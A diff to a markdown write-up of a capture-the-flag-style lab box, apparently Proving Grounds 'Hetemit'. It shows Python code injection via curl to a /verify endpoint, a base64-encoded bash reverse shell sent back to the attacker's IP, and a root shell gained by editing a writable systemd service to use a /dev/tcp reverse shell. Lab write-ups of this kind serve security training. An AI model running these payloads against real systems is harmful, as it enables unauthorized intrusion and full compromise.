@@ -178,7 +178,7 @@ So lets use curl to send data and see what output it results in
 5ba5e8553829ece373270af14adc76af939ea0ea74f87f0fc67c16c1b22c035d  
 ```
 
-Hmmm it does some hardcore creation of the email given 
+Hmmm it does returns the sha256hash of the email given 
 
 Lets test the other route which is /verify 
 ![image](https://user-images.githubusercontent.com/113513376/214731478-42ebc74b-ddd4-40e4-8da6-ec3e13c9dd71.png)
@@ -261,4 +261,215 @@ None
 Ok cool we know it's python 
 
 So im going to try importing modules then run system command
+
+```
+                                                                                                                                                                                              
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
+└─$ python3
+Python 3.10.8 (main, Oct 24 2022, 10:07:16) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> __import__("os")
+<module 'os' from '/usr/lib/python3.10/os.py'>
+>>> __import__("os").system("whoami")
+mark
+0
+>>> 
+```
+
+Now lets try it on the remote server
+
+```
+ 
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
+└─$ curl http://192.168.153.117:50000/verify -X POST -d 'code=__import__("os").system("id")' 
+0                                                                                                                                                                                              
+```
+
+It doesn't show any output
+
+Lets confirm is our payload really worked by pinging our host
+
+```
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
+└─$ curl http://192.168.153.117:50000/verify -X POST -d 'code=__import__("os").system("ping+-c+2+192.168.45.5")' 
+0                                                                                                                                                                                              
+```
+
+Back on tcpdump
+
+```
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
+└─$ sudo tcpdump -i tun0 icmp
+[sudo] password for mark: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+02:17:00.118813 IP 192.168.153.117 > haxor: ICMP echo request, id 2080, seq 1, length 64
+02:17:00.124682 IP haxor > 192.168.153.117: ICMP echo reply, id 2080, seq 1, length 64
+02:17:01.127486 IP 192.168.153.117 > haxor: ICMP echo request, id 2080, seq 2, length 64
+02:17:01.127513 IP haxor > 192.168.153.117: ICMP echo reply, id 2080, seq 2, length 64
+```
+
+So nice we have command exeution on the server
+
+Now lets get a reverse shell
+
+```
+┌──(mark__haxor)-[~/Desktop/Tools]
+└─$ ./shellgen.sh -t bash -i 192.168.45.5 -p 80 -e base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjUvODAgMD4mMQo=
+
+```
+
+![image](https://user-images.githubusercontent.com/113513376/214734144-7f0bc34b-5c83-42fb-ba79-5b2f04894a79.png)
+
+Now lets run it
+
+```
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
+└─$ curl http://192.168.153.117:50000/verify -X POST -d 'code=__import__("os").system("echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjUvODAgMD4mMQo%3D%20%7C%20base64%20-d%20%7C%20sh")'
+```
+
+Back on our listener
+
+```
+┌──(mark__haxor)-[~/Desktop/Tools]
+└─$ nc -lvnp 80    
+listening on [any] 80 ...
+connect to [192.168.45.5] from (UNKNOWN) [192.168.153.117] 46914
+bash: cannot set terminal process group (1022): Inappropriate ioctl for device
+bash: no job control in this shell
+[cmeeks@hetemit restjson_hetemit]$ 
+```
+
+Time to stabilze the shell
+
+```
+python3 -c "import pty; pty.spawn('/bin/bash')"
+export TERM=xterm
+CTRL + Z
+stty raw -echo;fg
+reset
+```
+
+Now lets escalate priv
+
+Checking for sudo perm shows what we can run
+
+```
+[cmeeks@hetemit restjson_hetemit]$ sudo -l
+Matching Defaults entries for cmeeks on hetemit:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User cmeeks may run the following commands on hetemit:
+    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
+[cmeeks@hetemit restjson_hetemit]$ 
+```
+
+well meaning we can restart a service with this perm given to us
+
+Lets find the file we will abuse to gain root
+
+```
+[cmeeks@hetemit restjson_hetemit]$ find /etc -type f -writable 2>/dev/null
+/etc/systemd/system/pythonapp.service
+[cmeeks@hetemit restjson_hetemit]$ 
+```
+
+Cool we have write access over the pythonapp.server file
+
+Lets go check it out
+
+```
+[cmeeks@hetemit restjson_hetemit]$ ls -l /etc/systemd/system/pythonapp.service
+-rw-rw-r-- 1 root cmeeks 302 Nov 13  2020 /etc/systemd/system/pythonapp.service
+[cmeeks@hetemit restjson_hetemit]$ head /etc/systemd/system/pythonapp.service
+[Unit]
+Description=Python App
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/home/cmeeks/restjson_hetemit
+ExecStart=flask run -h 0.0.0.0 -p 50000
+TimeoutSec=30
+RestartSec=15s
+[cmeeks@hetemit restjson_hetemit]$ 
+```
+
+Now lets edit it to our payload
+
+```
+[cmeeks@hetemit restjson_hetemit]$ nano /etc/systemd/system/pythonapp.service
+[cmeeks@hetemit restjson_hetemit]$ cat /etc/systemd/system/pythonapp.service
+[Unit]
+Description=Python App
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/home/cmeeks/restjson_hetemit
+ExecStart=bash -c 'bash -i >& /dev/tcp/192.168.45.5/18000 0>&1'
+TimeoutSec=30
+RestartSec=15s
+User=root
+ExecReload=/bin/kill -USR1 $MAINPID
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+[cmeeks@hetemit restjson_hetemit]$ 
+```
+
+Now i'll restart the box so as to restart the service
+
+```
+[cmeeks@hetemit system]$ sudo /sbin/reboot
+Terminated
+[cmeeks@hetemit system]$ 
+````
+
+Back on our listener 
+
+```
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Hetemit]
+└─$ nc -lvnp 18000
+listening on [any] 18000 ...
+connect to [192.168.45.5] from (UNKNOWN) [192.168.153.117] 38624
+bash: cannot set terminal process group (1222): Inappropriate ioctl for device
+bash: no job control in this shell
+[root@hetemit restjson_hetemit]# id 
+id 
+uid=0(root) gid=0(root) groups=0(root)
+[root@hetemit restjson_hetemit]# ls -al /root
+ls -al /root
+total 28
+dr-xr-x---.  2 root root  152 Jan 26 01:35 .
+dr-xr-xr-x. 17 root root  244 Nov 13  2020 ..
+-rw-------.  1 root root 1183 Nov 13  2020 anaconda-ks.cfg
+-rw-------.  1 root root    0 Nov 30  2020 .bash_history
+-rw-r--r--.  1 root root   18 May 11  2019 .bash_logout
+-rw-r--r--.  1 root root  176 May 11  2019 .bash_profile
+-rw-r--r--.  1 root root  176 May 11  2019 .bashrc
+-rw-r--r--.  1 root root  100 May 11  2019 .cshrc
+-rw-r--r--.  1 root root   33 Jan 26 01:35 proof.txt
+-rw-r--r--.  1 root root  129 May 11  2019 .tcshrc
+[root@hetemit restjson_hetemit]# 
+```
+
+And we're done 
+
+
+
+<br> <br>
+[Back To Home](../../index.md)
+<br>
+
+
+
 
